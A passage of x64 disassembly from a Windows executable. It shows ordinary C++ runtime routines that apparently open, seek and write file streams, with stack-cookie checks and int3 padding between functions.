   140004bdb:	cc                   	int3
   140004bdc:	cc                   	int3
   140004bdd:	cc                   	int3
   140004bde:	cc                   	int3
   140004bdf:	cc                   	int3
   140004be0:	40 53                	rex push %rbx
   140004be2:	48 83 ec 30          	sub    $0x30,%rsp
   140004be6:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140004bea:	48 8b d9             	mov    %rcx,%rbx
   140004bed:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004bf1:	76 2c                	jbe    0x140004c1f
   140004bf3:	48 8b 09             	mov    (%rcx),%rcx
   140004bf6:	48 ff c2             	inc    %rdx
   140004bf9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004c00:	72 18                	jb     0x140004c1a
   140004c02:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004c06:	48 83 c2 27          	add    $0x27,%rdx
   140004c0a:	48 2b c8             	sub    %rax,%rcx
   140004c0d:	48 83 e9 08          	sub    $0x8,%rcx
   140004c11:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004c15:	77 21                	ja     0x140004c38
   140004c17:	48 8b c8             	mov    %rax,%rcx
   140004c1a:	e8 41 1c 00 00       	call   0x140006860
   140004c1f:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   140004c26:	00 
   140004c27:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140004c2e:	00 
   140004c2f:	c6 03 00             	movb   $0x0,(%rbx)
   140004c32:	48 83 c4 30          	add    $0x30,%rsp
   140004c36:	5b                   	pop    %rbx
   140004c37:	c3                   	ret
   140004c38:	45 33 c9             	xor    %r9d,%r9d
   140004c3b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004c42:	00 00 
   140004c44:	45 33 c0             	xor    %r8d,%r8d
   140004c47:	33 d2                	xor    %edx,%edx
   140004c49:	33 c9                	xor    %ecx,%ecx
   140004c4b:	ff 15 b7 38 00 00    	call   *0x38b7(%rip)        # 0x140008508
   140004c51:	cc                   	int3
   140004c52:	cc                   	int3
   140004c53:	cc                   	int3
   140004c54:	cc                   	int3
   140004c55:	cc                   	int3
   140004c56:	cc                   	int3
   140004c57:	cc                   	int3
   140004c58:	cc                   	int3
   140004c59:	cc                   	int3
   140004c5a:	cc                   	int3
   140004c5b:	cc                   	int3
   140004c5c:	cc                   	int3
   140004c5d:	cc                   	int3
   140004c5e:	cc                   	int3
   140004c5f:	cc                   	int3
   140004c60:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004c65:	55                   	push   %rbp
   140004c66:	56                   	push   %rsi
   140004c67:	57                   	push   %rdi
   140004c68:	48 83 ec 70          	sub    $0x70,%rsp
   140004c6c:	48 8b 05 cd 83 00 00 	mov    0x83cd(%rip),%rax        # 0x14000d040
   140004c73:	48 33 c4             	xor    %rsp,%rax
   140004c76:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004c7b:	48 8b da             	mov    %rdx,%rbx
   140004c7e:	48 8b f1             	mov    %rcx,%rsi
   140004c81:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004c86:	33 ed                	xor    %ebp,%ebp
   140004c88:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   140004c8c:	48 8d 05 a5 41 00 00 	lea    0x41a5(%rip),%rax        # 0x140008e38
   140004c93:	48 89 01             	mov    %rax,(%rcx)
   140004c96:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   140004c9d:	ff 15 8d 35 00 00    	call   *0x358d(%rip)        # 0x140008230
   140004ca3:	90                   	nop
   140004ca4:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140004cab:	00 
   140004cac:	48 8d 7e 08          	lea    0x8(%rsi),%rdi
   140004cb0:	45 33 c9             	xor    %r9d,%r9d
   140004cb3:	45 33 c0             	xor    %r8d,%r8d
   140004cb6:	48 8b d7             	mov    %rdi,%rdx
   140004cb9:	48 8b ce             	mov    %rsi,%rcx
   140004cbc:	ff 15 c6 34 00 00    	call   *0x34c6(%rip)        # 0x140008188
   140004cc2:	90                   	nop
   140004cc3:	48 8b 06             	mov    (%rsi),%rax
   140004cc6:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004cca:	48 8d 05 47 41 00 00 	lea    0x4147(%rip),%rax        # 0x140008e18
   140004cd1:	48 89 04 31          	mov    %rax,(%rcx,%rsi,1)
   140004cd5:	48 8b 06             	mov    (%rsi),%rax
   140004cd8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004cdc:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140004ce2:	89 54 31 fc          	mov    %edx,-0x4(%rcx,%rsi,1)
   140004ce6:	48 8b cf             	mov    %rdi,%rcx
   140004ce9:	ff 15 11 35 00 00    	call   *0x3511(%rip)        # 0x140008200
   140004cef:	48 8d 05 a2 40 00 00 	lea    0x40a2(%rip),%rax        # 0x140008d98
   140004cf6:	48 89 07             	mov    %rax,(%rdi)
   140004cf9:	40 88 6f 7c          	mov    %bpl,0x7c(%rdi)
   140004cfd:	40 88 6f 71          	mov    %bpl,0x71(%rdi)
   140004d01:	48 8b cf             	mov    %rdi,%rcx
   140004d04:	ff 15 06 35 00 00    	call   *0x3506(%rip)        # 0x140008210
   140004d0a:	48 89 af 80 00 00 00 	mov    %rbp,0x80(%rdi)
   140004d11:	48 8b 05 68 8c 00 00 	mov    0x8c68(%rip),%rax        # 0x14000d980
   140004d18:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140004d1c:	48 89 6f 68          	mov    %rbp,0x68(%rdi)
   140004d20:	ba 32 00 00 00       	mov    $0x32,%edx
   140004d25:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004d2b:	48 8b cb             	mov    %rbx,%rcx
   140004d2e:	ff 15 94 34 00 00    	call   *0x3494(%rip)        # 0x1400081c8
   140004d34:	48 8b d8             	mov    %rax,%rbx
   140004d37:	48 85 c0             	test   %rax,%rax
   140004d3a:	0f 84 db 00 00 00    	je     0x140004e1b
   140004d40:	c6 47 7c 01          	movb   $0x1,0x7c(%rdi)
   140004d44:	40 88 6f 71          	mov    %bpl,0x71(%rdi)
   140004d48:	48 8b cf             	mov    %rdi,%rcx
   140004d4b:	ff 15 bf 34 00 00    	call   *0x34bf(%rip)        # 0x140008210
   140004d51:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140004d56:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140004d5b:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140004d60:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140004d65:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140004d6a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004d6f:	48 8b cb             	mov    %rbx,%rcx
   140004d72:	ff 15 f8 37 00 00    	call   *0x37f8(%rip)        # 0x140008570
   140004d78:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140004d7d:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140004d81:	48 89 47 20          	mov    %rax,0x20(%rdi)
   140004d85:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004d8a:	48 89 47 38          	mov    %rax,0x38(%rdi)
   140004d8e:	48 89 47 40          	mov    %rax,0x40(%rdi)
   140004d92:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140004d97:	48 89 47 50          	mov    %rax,0x50(%rdi)
   140004d9b:	48 89 47 58          	mov    %rax,0x58(%rdi)
   140004d9f:	48 89 9f 80 00 00 00 	mov    %rbx,0x80(%rdi)
   140004da6:	48 8b 05 d3 8b 00 00 	mov    0x8bd3(%rip),%rax        # 0x14000d980
   140004dad:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140004db1:	48 89 6f 68          	mov    %rbp,0x68(%rdi)
   140004db5:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004dba:	48 8b cf             	mov    %rdi,%rcx
   140004dbd:	ff 15 45 34 00 00    	call   *0x3445(%rip)        # 0x140008208
   140004dc3:	90                   	nop
   140004dc4:	48 8b c8             	mov    %rax,%rcx
   140004dc7:	e8 74 10 00 00       	call   0x140005e40
   140004dcc:	48 8b d8             	mov    %rax,%rbx
   140004dcf:	48 8b c8             	mov    %rax,%rcx
   140004dd2:	ff 15 58 33 00 00    	call   *0x3358(%rip)        # 0x140008130
   140004dd8:	84 c0                	test   %al,%al
   140004dda:	74 06                	je     0x140004de2
   140004ddc:	48 89 6f 68          	mov    %rbp,0x68(%rdi)
   140004de0:	eb 0e                	jmp    0x140004df0
   140004de2:	48 89 5f 68          	mov    %rbx,0x68(%rdi)
   140004de6:	48 8b cf             	mov    %rdi,%rcx
   140004de9:	ff 15 21 34 00 00    	call   *0x3421(%rip)        # 0x140008210
   140004def:	90                   	nop
   140004df0:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004df5:	48 85 c9             	test   %rcx,%rcx
   140004df8:	74 1c                	je     0x140004e16
   140004dfa:	48 8b 01             	mov    (%rcx),%rax
   140004dfd:	ff 50 10             	call   *0x10(%rax)
   140004e00:	48 85 c0             	test   %rax,%rax
   140004e03:	74 11                	je     0x140004e16
   140004e05:	48 8b 08             	mov    (%rax),%rcx
   140004e08:	4c 8b 01             	mov    (%rcx),%r8
   140004e0b:	ba 01 00 00 00       	mov    $0x1,%edx
   140004e10:	48 8b c8             	mov    %rax,%rcx
   140004e13:	41 ff d0             	call   *%r8
   140004e16:	48 85 ff             	test   %rdi,%rdi
   140004e19:	75 19                	jne    0x140004e34
   140004e1b:	48 8b 06             	mov    (%rsi),%rax
   140004e1e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004e22:	48 03 ce             	add    %rsi,%rcx
   140004e25:	45 33 c0             	xor    %r8d,%r8d
   140004e28:	ba 02 00 00 00       	mov    $0x2,%edx
   140004e2d:	ff 15 f5 33 00 00    	call   *0x33f5(%rip)        # 0x140008228
   140004e33:	90                   	nop
   140004e34:	48 8b c6             	mov    %rsi,%rax
   140004e37:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004e3c:	48 33 cc             	xor    %rsp,%rcx
   140004e3f:	e8 fc 19 00 00       	call   0x140006840
   140004e44:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140004e4b:	00 
   140004e4c:	48 83 c4 70          	add    $0x70,%rsp
   140004e50:	5f                   	pop    %rdi
   140004e51:	5e                   	pop    %rsi
   140004e52:	5d                   	pop    %rbp
   140004e53:	c3                   	ret
   140004e54:	cc                   	int3
   140004e55:	cc                   	int3
   140004e56:	cc                   	int3
   140004e57:	cc                   	int3
   140004e58:	cc                   	int3
   140004e59:	cc                   	int3
   140004e5a:	cc                   	int3
   140004e5b:	cc                   	int3
   140004e5c:	cc                   	int3
   140004e5d:	cc                   	int3
   140004e5e:	cc                   	int3
   140004e5f:	cc                   	int3
   140004e60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004e65:	57                   	push   %rdi
   140004e66:	48 83 ec 20          	sub    $0x20,%rsp
   140004e6a:	48 8b d9             	mov    %rcx,%rbx
   140004e6d:	48 8b ca             	mov    %rdx,%rcx
   140004e70:	e8 cb 0f 00 00       	call   0x140005e40
   140004e75:	48 8b c8             	mov    %rax,%rcx
   140004e78:	48 8b f8             	mov    %rax,%rdi
   140004e7b:	ff 15 af 32 00 00    	call   *0x32af(%rip)        # 0x140008130
   140004e81:	84 c0                	test   %al,%al
   140004e83:	74 13                	je     0x140004e98
   140004e85:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
   140004e8c:	00 
   140004e8d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004e92:	48 83 c4 20          	add    $0x20,%rsp
   140004e96:	5f                   	pop    %rdi
   140004e97:	c3                   	ret
   140004e98:	48 8b cb             	mov    %rbx,%rcx
   140004e9b:	48 89 7b 68          	mov    %rdi,0x68(%rbx)
   140004e9f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004ea4:	48 83 c4 20          	add    $0x20,%rsp
   140004ea8:	5f                   	pop    %rdi
   140004ea9:	48 ff 25 60 33 00 00 	rex.W jmp *0x3360(%rip)        # 0x140008210
   140004eb0:	40 53                	rex push %rbx
   140004eb2:	48 83 ec 20          	sub    $0x20,%rsp
   140004eb6:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140004ebd:	00 
   140004ebe:	48 8b d9             	mov    %rcx,%rbx
   140004ec1:	74 2d                	je     0x140004ef0
   140004ec3:	48 8b 01             	mov    (%rcx),%rax
   140004ec6:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140004ecb:	ff 50 18             	call   *0x18(%rax)
   140004ece:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004ed1:	74 1d                	je     0x140004ef0
   140004ed3:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140004eda:	ff 15 a0 36 00 00    	call   *0x36a0(%rip)        # 0x140008580
   140004ee0:	33 c9                	xor    %ecx,%ecx
   140004ee2:	85 c0                	test   %eax,%eax
   140004ee4:	0f 99 c1             	setns  %cl
   140004ee7:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140004eea:	48 83 c4 20          	add    $0x20,%rsp
   140004eee:	5b                   	pop    %rbx
   140004eef:	c3                   	ret
   140004ef0:	33 c0                	xor    %eax,%eax
   140004ef2:	48 83 c4 20          	add    $0x20,%rsp
   140004ef6:	5b                   	pop    %rbx
   140004ef7:	c3                   	ret
   140004ef8:	cc                   	int3
   140004ef9:	cc                   	int3
   140004efa:	cc                   	int3
   140004efb:	cc                   	int3
   140004efc:	cc                   	int3
   140004efd:	cc                   	int3
   140004efe:	cc                   	int3
   140004eff:	cc                   	int3
   140004f00:	40 53                	rex push %rbx
   140004f02:	56                   	push   %rsi
   140004f03:	48 83 ec 48          	sub    $0x48,%rsp
   140004f07:	48 8b 05 32 81 00 00 	mov    0x8132(%rip),%rax        # 0x14000d040
   140004f0e:	48 33 c4             	xor    %rsp,%rax
   140004f11:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004f16:	33 f6                	xor    %esi,%esi
   140004f18:	4d 8b c8             	mov    %r8,%r9
   140004f1b:	48 8b d9             	mov    %rcx,%rbx
   140004f1e:	48 85 d2             	test   %rdx,%rdx
   140004f21:	75 0b                	jne    0x140004f2e
   140004f23:	4d 85 c0             	test   %r8,%r8
   140004f26:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004f2c:	74 03                	je     0x140004f31
   140004f2e:	44 8b c6             	mov    %esi,%r8d
   140004f31:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140004f38:	48 85 c9             	test   %rcx,%rcx
   140004f3b:	0f 84 9e 00 00 00    	je     0x140004fdf
   140004f41:	ff 15 e1 35 00 00    	call   *0x35e1(%rip)        # 0x140008528
   140004f47:	85 c0                	test   %eax,%eax
   140004f49:	0f 85 90 00 00 00    	jne    0x140004fdf
   140004f4f:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140004f54:	48 8b cb             	mov    %rbx,%rcx
   140004f57:	48 8b bb 80 00 00 00 	mov    0x80(%rbx),%rdi
   140004f5e:	c6 43 7c 01          	movb   $0x1,0x7c(%rbx)
   140004f62:	40 88 73 71          	mov    %sil,0x71(%rbx)
   140004f66:	ff 15 a4 32 00 00    	call   *0x32a4(%rip)        # 0x140008210
   140004f6c:	48 85 ff             	test   %rdi,%rdi
   140004f6f:	74 4e                	je     0x140004fbf
   140004f71:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140004f76:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004f7b:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140004f80:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140004f85:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004f8a:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140004f8f:	48 8b cf             	mov    %rdi,%rcx
   140004f92:	ff 15 d8 35 00 00    	call   *0x35d8(%rip)        # 0x140008570
   140004f98:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140004f9d:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140004fa1:	48 89 4b 20          	mov    %rcx,0x20(%rbx)
   140004fa5:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140004faa:	48 89 4b 38          	mov    %rcx,0x38(%rbx)
   140004fae:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   140004fb2:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004fb7:	48 89 4b 50          	mov    %rcx,0x50(%rbx)
   140004fbb:	48 89 4b 58          	mov    %rcx,0x58(%rbx)
   140004fbf:	48 8b 0d ba 89 00 00 	mov    0x89ba(%rip),%rcx        # 0x14000d980
   140004fc6:	48 8b c3             	mov    %rbx,%rax
   140004fc9:	48 89 bb 80 00 00 00 	mov    %rdi,0x80(%rbx)
   140004fd0:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140004fd5:	48 89 4b 74          	mov    %rcx,0x74(%rbx)
   140004fd9:	48 89 73 68          	mov    %rsi,0x68(%rbx)
   140004fdd:	eb 02                	jmp    0x140004fe1
   140004fdf:	33 c0                	xor    %eax,%eax
   140004fe1:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004fe6:	48 33 cc             	xor    %rsp,%rcx
   140004fe9:	e8 52 18 00 00       	call   0x140006840
   140004fee:	48 83 c4 48          	add    $0x48,%rsp
   140004ff2:	5e                   	pop    %rsi
   140004ff3:	5b                   	pop    %rbx
   140004ff4:	c3                   	ret
   140004ff5:	cc                   	int3
   140004ff6:	cc                   	int3
   140004ff7:	cc                   	int3
   140004ff8:	cc                   	int3
   140004ff9:	cc                   	int3
   140004ffa:	cc                   	int3
   140004ffb:	cc                   	int3
   140004ffc:	cc                   	int3
   140004ffd:	cc                   	int3
   140004ffe:	cc                   	int3
   140004fff:	cc                   	int3
   140005000:	40 53                	rex push %rbx
   140005002:	56                   	push   %rsi
   140005003:	57                   	push   %rdi
   140005004:	48 83 ec 30          	sub    $0x30,%rsp
   140005008:	48 8b 05 31 80 00 00 	mov    0x8031(%rip),%rax        # 0x14000d040
   14000500f:	48 33 c4             	xor    %rsp,%rax
   140005012:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005017:	49 8b 40 08          	mov    0x8(%r8),%rax
   14000501b:	49 8b f0             	mov    %r8,%rsi
   14000501e:	49 03 00             	add    (%r8),%rax
   140005021:	48 8b da             	mov    %rdx,%rbx
   140005024:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000502b:	00 
   14000502c:	48 8b f9             	mov    %rcx,%rdi
   14000502f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005034:	74 70                	je     0x1400050a6
   140005036:	e8 65 0f 00 00       	call   0x140005fa0
   14000503b:	84 c0                	test   %al,%al
   14000503d:	74 67                	je     0x1400050a6
   14000503f:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140005046:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000504b:	ff 15 cf 34 00 00    	call   *0x34cf(%rip)        # 0x140008520
   140005051:	85 c0                	test   %eax,%eax
   140005053:	75 51                	jne    0x1400050a6
   140005055:	48 8b 46 10          	mov    0x10(%rsi),%rax
   140005059:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   14000505d:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140005061:	48 8d 47 70          	lea    0x70(%rdi),%rax
   140005065:	48 39 01             	cmp    %rax,(%rcx)
   140005068:	75 22                	jne    0x14000508c
   14000506a:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140005071:	4c 8b 87 90 00 00 00 	mov    0x90(%rdi),%r8
   140005078:	48 89 11             	mov    %rdx,(%rcx)
   14000507b:	44 2b c2             	sub    %edx,%r8d
   14000507e:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140005082:	48 89 11             	mov    %rdx,(%rcx)
   140005085:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   140005089:	44 89 01             	mov    %r8d,(%rcx)
   14000508c:	48 8b 57 74          	mov    0x74(%rdi),%rdx
   140005090:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140005095:	48 89 0b             	mov    %rcx,(%rbx)
   140005098:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   14000509c:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   1400050a3:	00 
   1400050a4:	eb 15                	jmp    0x1400050bb
   1400050a6:	33 c0                	xor    %eax,%eax
   1400050a8:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   1400050af:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   1400050b6:	00 
   1400050b7:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400050bb:	48 8b c3             	mov    %rbx,%rax
   1400050be:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400050c3:	48 33 cc             	xor    %rsp,%rcx
   1400050c6:	e8 75 17 00 00       	call   0x140006840
   1400050cb:	48 83 c4 30          	add    $0x30,%rsp
   1400050cf:	5f                   	pop    %rdi
   1400050d0:	5e                   	pop    %rsi
   1400050d1:	5b                   	pop    %rbx
   1400050d2:	c3                   	ret
   1400050d3:	cc                   	int3
   1400050d4:	cc                   	int3
   1400050d5:	cc                   	int3
   1400050d6:	cc                   	int3
   1400050d7:	cc                   	int3
   1400050d8:	cc                   	int3
   1400050d9:	cc                   	int3
   1400050da:	cc                   	int3
   1400050db:	cc                   	int3
   1400050dc:	cc                   	int3
   1400050dd:	cc                   	int3
   1400050de:	cc                   	int3
   1400050df:	cc                   	int3
   1400050e0:	40 53                	rex push %rbx
   1400050e2:	55                   	push   %rbp
   1400050e3:	56                   	push   %rsi
   1400050e4:	57                   	push   %rdi
   1400050e5:	41 56                	push   %r14
   1400050e7:	48 83 ec 30          	sub    $0x30,%rsp
   1400050eb:	48 8b 05 4e 7f 00 00 	mov    0x7f4e(%rip),%rax        # 0x14000d040
   1400050f2:	48 33 c4             	xor    %rsp,%rax
   1400050f5:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400050fa:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400050fe:	4c 8d 71 70          	lea    0x70(%rcx),%r14
   140005102:	41 8b e9             	mov    %r9d,%ebp
   140005105:	49 8b f0             	mov    %r8,%rsi
   140005108:	48 8b fa             	mov    %rdx,%rdi
   14000510b:	48 8b d9             	mov    %rcx,%rbx
   14000510e:	4c 39 30             	cmp    %r14,(%rax)
   140005111:	75 10                	jne    0x140005123
   140005113:	41 83 f9 01          	cmp    $0x1,%r9d
   140005117:	75 0a                	jne    0x140005123
   140005119:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000511e:	75 03                	jne    0x140005123
   140005120:	48 ff ce             	dec    %rsi
   140005123:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000512a:	00 
   14000512b:	0f 84 85 00 00 00    	je     0x1400051b6
   140005131:	e8 6a 0e 00 00       	call   0x140005fa0
   140005136:	84 c0                	test   %al,%al
   140005138:	74 7c                	je     0x1400051b6
   14000513a:	48 85 f6             	test   %rsi,%rsi
   14000513d:	75 05                	jne    0x140005144
   14000513f:	83 fd 01             	cmp    $0x1,%ebp
   140005142:	74 17                	je     0x14000515b
   140005144:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000514b:	44 8b c5             	mov    %ebp,%r8d
   14000514e:	48 8b d6             	mov    %rsi,%rdx
   140005151:	ff 15 31 34 00 00    	call   *0x3431(%rip)        # 0x140008588
   140005157:	85 c0                	test   %eax,%eax
   140005159:	75 5b                	jne    0x1400051b6
   14000515b:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140005162:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005167:	ff 15 c3 33 00 00    	call   *0x33c3(%rip)        # 0x140008530
   14000516d:	85 c0                	test   %eax,%eax
   14000516f:	75 45                	jne    0x1400051b6
   140005171:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140005175:	4c 39 30             	cmp    %r14,(%rax)
   140005178:	75 22                	jne    0x14000519c
   14000517a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140005181:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140005188:	48 89 10             	mov    %rdx,(%rax)
   14000518b:	44 2b c2             	sub    %edx,%r8d
   14000518e:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140005192:	48 89 11             	mov    %rdx,(%rcx)
   140005195:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140005199:	44 89 01             	mov    %r8d,(%rcx)
   14000519c:	48 8b 53 74          	mov    0x74(%rbx),%rdx
   1400051a0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400051a5:	48 89 0f             	mov    %rcx,(%rdi)
   1400051a8:	48 89 57 10          	mov    %rdx,0x10(%rdi)
   1400051ac:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   1400051b3:	00 
   1400051b4:	eb 15                	jmp    0x1400051cb
   1400051b6:	33 c0                	xor    %eax,%eax
   1400051b8:	48 c7 07 ff ff ff ff 	movq   $0xffffffffffffffff,(%rdi)
   1400051bf:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   1400051c6:	00 
   1400051c7:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400051cb:	48 8b c7             	mov    %rdi,%rax
   1400051ce:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400051d3:	48 33 cc             	xor    %rsp,%rcx
   1400051d6:	e8 65 16 00 00       	call   0x140006840
   1400051db:	48 83 c4 30          	add    $0x30,%rsp
   1400051df:	41 5e                	pop    %r14
   1400051e1:	5f                   	pop    %rdi
   1400051e2:	5e                   	pop    %rsi
   1400051e3:	5d                   	pop    %rbp
   1400051e4:	5b                   	pop    %rbx
   1400051e5:	c3                   	ret
   1400051e6:	cc                   	int3
   1400051e7:	cc                   	int3
   1400051e8:	cc                   	int3
   1400051e9:	cc                   	int3
   1400051ea:	cc                   	int3
   1400051eb:	cc                   	int3
   1400051ec:	cc                   	int3
   1400051ed:	cc                   	int3
   1400051ee:	cc                   	int3
   1400051ef:	cc                   	int3
   1400051f0:	40 53                	rex push %rbx
   1400051f2:	55                   	push   %rbp
   1400051f3:	57                   	push   %rdi
   1400051f4:	48 83 ec 20          	sub    $0x20,%rsp
   1400051f8:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400051fd:	49 8b d8             	mov    %r8,%rbx
   140005200:	48 8b ea             	mov    %rdx,%rbp
   140005203:	48 8b f9             	mov    %rcx,%rdi
   140005206:	74 0e                	je     0x140005216
   140005208:	48 83 c4 20          	add    $0x20,%rsp
   14000520c:	5f                   	pop    %rdi
   14000520d:	5d                   	pop    %rbp
   14000520e:	5b                   	pop    %rbx
   14000520f:	48 ff 25 3a 2f 00 00 	rex.W jmp *0x2f3a(%rip)        # 0x140008150
   140005216:	48 8b 41 40          	mov    0x40(%rcx),%rax
   14000521a:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   14000521f:	48 8b f3             	mov    %rbx,%rsi
   140005222:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140005227:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   14000522c:	4c 8b 08             	mov    (%rax),%r9
   14000522f:	4d 85 c9             	test   %r9,%r9
   140005232:	74 08                	je     0x14000523c
   140005234:	48 8b 41 58          	mov    0x58(%rcx),%rax
   140005238:	8b 08                	mov    (%rax),%ecx
   14000523a:	eb 02                	jmp    0x14000523e
   14000523c:	33 c9                	xor    %ecx,%ecx
   14000523e:	4c 63 f9             	movslq %ecx,%r15
   140005241:	48 85 db             	test   %rbx,%rbx
   140005244:	7e 52                	jle    0x140005298
   140005246:	85 c9                	test   %ecx,%ecx
   140005248:	7e 2e                	jle    0x140005278
   14000524a:	49 3b df             	cmp    %r15,%rbx
   14000524d:	49 8b c9             	mov    %r9,%rcx
   140005250:	4c 0f 4c fb          	cmovl  %rbx,%r15
   140005254:	4d 8b c7             	mov    %r15,%r8
   140005257:	e8 9f 25 00 00       	call   0x1400077fb
   14000525c:	48 8b 47 58          	mov    0x58(%rdi),%rax
   140005260:	49 2b df             	sub    %r15,%rbx
   140005263:	49 03 ef             	add    %r15,%rbp
   140005266:	44 29 38             	sub    %r15d,(%rax)
   140005269:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   14000526d:	49 63 c7             	movslq %r15d,%rax
   140005270:	48 01 01             	add    %rax,(%rcx)
   140005273:	48 85 db             	test   %rbx,%rbx
   140005276:	7e 20                	jle    0x140005298
   140005278:	4c 8b 8f 80 00 00 00 	mov    0x80(%rdi),%r9
   14000527f:	4d 85 c9             	test   %r9,%r9
   140005282:	74 14                	je     0x140005298
   140005284:	4c 8b c3             	mov    %rbx,%r8
   140005287:	ba 01 00 00 00       	mov    $0x1,%edx
   14000528c:	48 8b cd             	mov    %rbp,%rcx
   14000528f:	ff 15 a3 32 00 00    	call   *0x32a3(%rip)        # 0x140008538
   140005295:	48 2b d8             	sub    %rax,%rbx
   140005298:	4c 8b 7c 24 58       	mov    0x58(%rsp),%r15
   14000529d:	48 2b f3             	sub    %rbx,%rsi
   1400052a0:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   1400052a5:	48 8b c6             	mov    %rsi,%rax
   1400052a8:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
